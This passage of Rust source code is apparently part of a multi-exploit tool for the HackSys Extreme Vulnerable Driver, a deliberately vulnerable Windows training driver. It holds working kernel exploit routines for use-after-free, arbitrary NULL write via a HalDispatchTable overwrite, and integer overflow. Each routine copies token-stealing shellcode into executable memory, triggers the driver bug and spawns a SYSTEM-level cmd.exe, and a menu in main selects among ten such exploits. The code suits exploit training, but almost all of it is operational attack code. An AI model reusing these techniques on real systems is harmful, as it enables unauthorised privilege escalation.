        // HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT
        println! ("[+] Free UAF Object");
        DeviceIoControl(hev_device, 0x22201b, ptr::null_mut(), 0, ptr::null_mut(), 0, &mut n_read, ptr::null_mut());

        // HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT
        println! ("[+] Allocate fake UAF Object");
        DeviceIoControl(hev_device, 0x22201f, user_obj.as_ptr() as *mut std::os::raw::c_void, user_obj.len() as u32, ptr::null_mut(), 0, &mut n_read, ptr::null_mut());

        // HACKSYS_EVD_IOCTL_USE_UAF_OBJECT
        println! ("[+] Triggering the vuln");
        DeviceIoControl(hev_device, 0x222017, ptr::null_mut(), 0, ptr::null_mut(), 0, &mut n_read, ptr::null_mut());

        CloseHandle(hev_device);
    }

    if check_system() {
        println! ("[+] NT_AUTHORITY\\SYSTEM shell incoming");
        let mut child = Command::new(cmd).spawn().expect("Failed to execute command");
        let _ecode = child.wait()
                     .expect("failed to wait on child");
    }
    else {
        println! ("[-] Failed getting SYSTEM");
    }
}

#[cfg(windows)]
fn write_null_at (addr : u32) -> bool {
    use kernel32::{ CloseHandle, DeviceIoControl };

    let mut www : Vec<u8> = Vec::with_capacity(16);
    let mut n_read : u32 = 0;

    www.write_u32::<LittleEndian>(addr).unwrap();

    let hev_device = open_device();

    println! ("-> Writing NULL to 0x{:x}", addr);
    unsafe {
        let rc = DeviceIoControl(hev_device,
                        0x222047,
                        www.as_ptr() as *mut std::os::raw::c_void,
                        www.len() as u32,
                        ptr::null_mut(),
                        0,
                        &mut n_read,
                        ptr::null_mut());

        CloseHandle(hev_device);

        if rc != 0 {
            return true;
        }
    }

    return false;
}

#[cfg(windows)]
fn exploit_arbitrary_null (cmd : &str) {
    use std::ffi::CString;
    use kernel32::{ GetProcAddress };
    use kernel32::{ VirtualProtect, LoadLibraryExA };
    use winapi::um::winnt::RtlMoveMemory;

    let payload_end : Vec<u8> = vec![
        0x31, 0xc0,         // xor eax, eax
        0x83, 0xc4, 0x24,   // add esp, byte +0x24
        0x5d,               // pop ebp
        0xc2, 0x08, 0x00,   // ret 0x8
    ];
    let payload = get_payload_token_stealing(&payload_end);

    let len_payload = payload.len();

    println! ("\n== Arbitrary NULL Exploitation\n");

    println! ("[+] Looking for Windows kernel base");
    let mod_ntkrnl = match lookup_base("ntkrnl") {
        Some (v) => v,
        None => panic! ("Failed resolving ntkrnl base"),
    };
    let (name_ntkrnl, base_ntkrnl) = mod_ntkrnl;
    println! ("-> kernel base               : 0x{:x}", base_ntkrnl);
    println! ("name : {} addr : 0x{:x}", name_ntkrnl, base_ntkrnl);

    let mod_hal = match lookup_base("hal") {
        Some (v) => v,
        None => panic! ("Failed resolving hal base"),
    };
    let (name_hal, base_hal) = mod_hal;
    println! ("-> HAL base                  : 0x{:x}", base_hal);
    println! ("name : {} addr : 0x{:x}", name_hal, base_hal);

    let addr_ntkrnl;
    let mut addr_hal_dispatch;
    unsafe {
        println! ("[+] Getting HalDispatchTable offset in ntkrnl");
        addr_ntkrnl = LoadLibraryExA(name_ntkrnl.as_ptr() as *const i8, ptr::null_mut(), 1);
        if addr_ntkrnl == ptr::null_mut() {
            panic! ("Unable to load ntkrnl");
        }
        println! ("-> ntkrnl base               : 0x{:x}", addr_ntkrnl as u32);

        let symbol_name = CString::new("HalDispatchTable").unwrap();
        addr_hal_dispatch = GetProcAddress(addr_ntkrnl,
                                           symbol_name.as_ptr() as *const i8);
        if addr_hal_dispatch == ptr::null_mut() {
            panic! ("Unable to load HAL");
        }
        let off_hal = addr_hal_dispatch as usize - addr_ntkrnl as usize;
        println! ("-> HalDispatchTable uaddr    : 0x{:x}", addr_hal_dispatch as u32);
        println! ("-> HalDispatchTable offset   : 0x{:x}", off_hal);

        println! ("[+] Getting HalDispatchTable kernel address");
        addr_hal_dispatch = (base_ntkrnl + off_hal) as *mut std::os::raw::c_void;
        println! ("-> HalDispatchTable addr     : 0x{:x}", addr_hal_dispatch as usize);
        println! ("-> HalDispatchTable+4 addr   : 0x{:x}", addr_hal_dispatch as usize + 4);

        println! ("[+] Resolving HaliQuerySystemInformation");
        println! ("-> Loading {}", name_hal);
        let addr_hal = LoadLibraryExA(name_hal.as_ptr() as *const i8, ptr::null_mut(), 1);
        if addr_hal == ptr::null_mut() {
            panic! ("Unable to load HAL");
        }

        println! ("[+] Allocating shellcode space");

        println! ("[+] Prepare NULL Page");
        let null_page = alloc_null_page();
        if null_page != 0 {
            panic! ("[-] Couldn't allocate NULL page");
        }

        println! ("[+] Set NULL Page to RWX");
        let mut oldProtect = 0;
        VirtualProtect(ptr::null_mut(), 0x1000, 0x40, &mut oldProtect);

        let addr_shellcode = null_page;

        println! ("[+] Copying shellcode to address : 0x{:x}", addr_shellcode as u64);
        RtlMoveMemory(addr_shellcode as *mut winapi::ctypes::c_void, payload.as_ptr() as *const winapi::ctypes::c_void, len_payload);

        println! ("[+] Patching HalDispatchTable+4 with NULL");
        if write_null_at(addr_hal_dispatch as u32 + 4) == false {
            println! ("[-] Arbitrary NULL IOCTL is not implemented");
            process::exit (1);
        }

        raw_input("Before trigger");

        println! ("[+] Trigger privesc");
        let mut interval : Vec<u8> = Vec::with_capacity(16);
        interval.write_u32::<LittleEndian>(0).unwrap();
        NtQueryIntervalProfile(0x1337 as PVOID, interval.as_ptr() as ULONG_PTR);

        // XXX: dynamically resolve HaliQuerySystemInformation,
        println! ("[+] Restoring HalDispatchTable+4 with original value : 0x{:x}", base_hal as u32 + 0x278a2);
        write4_at(addr_hal_dispatch as u32 + 4, base_hal as u32 + 0x278a2);
    }

    if check_system() {
        println! ("[+] NT_AUTHORITY\\SYSTEM shell incoming");
        let mut child = Command::new(cmd).spawn().expect("Failed to execute command");
        let _ecode = child.wait()
                     .expect("failed to wait on child");
    }
    else {
        println! ("[-] Failed getting SYSTEM");
    }
}

#[cfg(windows)]
fn exploit_integer_overflow (cmd : &str) {
    use kernel32::{CloseHandle, VirtualAlloc, DeviceIoControl};
    use winapi::um::winnt::RtlMoveMemory;

    let payload_end : Vec<u8> = vec![
        0x31, 0xc0,         // xor eax, eax
        0x5d,               // pop ebp
        0xc2, 0x08, 0x00,   // ret 0x8
    ];
    let payload = get_payload_token_stealing(&payload_end);
    let mut n_read : u32 = 0;

    let len_payload = payload.len();

    println! ("\n== Integer Overflow Exploitation\n");

    unsafe {
        println! ("[+] Allocating shellcode space");
        let ptr = VirtualAlloc(ptr::null_mut(), len_payload as u32, 0x3000, 0x40);
        println! ("[+] Copying shellcode");
        RtlMoveMemory(ptr as *mut winapi::ctypes::c_void, payload.as_ptr() as *const winapi::ctypes::c_void, len_payload);

        println! ("[+] Preparing attack payload");
        let n_len = 2092;
        let mut buf : Vec<u8> = Vec::with_capacity(n_len);
        let n_iter = n_len / 4;

        for _idx_iter in 0..n_iter {
            buf.write_u32::<LittleEndian>(ptr as u32).unwrap();
        }

        // terminator
        buf.write_u32::<LittleEndian>(0xbad0b0b0).unwrap();

        println! ("[+] Opening device");
        let hev_device = open_device();

        println! ("[+] Triggering vuln");
        DeviceIoControl(hev_device, 0x222027, buf.as_ptr() as *mut std::os::raw::c_void, 0xFFFFFFFC, ptr::null_mut(), 0, &mut n_read, ptr::null_mut());

        CloseHandle(hev_device);
    }

    if check_system() {
        println! ("[+] NT_AUTHORITY\\SYSTEM shell incoming");
        let mut child = Command::new(cmd).spawn().expect("Failed to execute command");
        let _ecode = child.wait()
                     .expect("failed to wait on child");
    }
    else {
        println! ("[-] Failed getting SYSTEM");
    }
}

fn raw_input (msg : &str) -> String {
    let mut user_buf = String::new();

    print! ("{}", msg);
    let _ = stdout().flush();

    stdin().read_line(&mut user_buf).expect("Did not enter a correct string");
    if let Some('\n') = user_buf.chars().next_back() {
        user_buf.pop();
    }
    if let Some('\r') = user_buf.chars().next_back() {
        user_buf.pop();
    }

    user_buf
}

fn main() {
    println! ("HEVD Multi-Exploit v0.1 by m_101\n");
    println! ("== TOKEN STEALING SHELLCODE");
    println! ("1    - Stack Overflow");
    println! ("2    - Arbitrary Over-write");
    println! ("3    - Non-Paged Pool Overflow");
    println! ("4    - NULL Dereference");
    println! ("5    - Non initialized stack");
    println! ("6    - Non initialized heap");
    println! ("7    - Use-after-Free");
    println! ("8    - Double Fetch");
    println! ("9    - Arbitrary NULL write");
    println! ("10   - Integer Overflow\n");

    let user_buf = raw_input("Please enter a choice : ");
    let choice : u32 = match user_buf.parse() {
        Ok (v) => v,
        Err (_e) => 0x1337,
    };

    match choice {
        1   => exploit_bof_token("cmd.exe"),
        2   => exploit_arbitrary_write("cmd.exe"),
        3   => exploit_nonpaged_pool_overflow_token("cmd.exe"),
        4   => exploit_null_deref_token("cmd.exe"),
        5   => exploit_non_init_stack("cmd.exe"),
        6   => exploit_non_init_heap("cmd.exe"),
        7   => exploit_uaf("cmd.exe"),
        8   => exploit_double_fetch("cmd.exe"),
        9   => exploit_arbitrary_null("cmd.exe"),
        10  => exploit_integer_overflow("cmd.exe"),
        _   => println! ("Not doing anything "),
    }
}

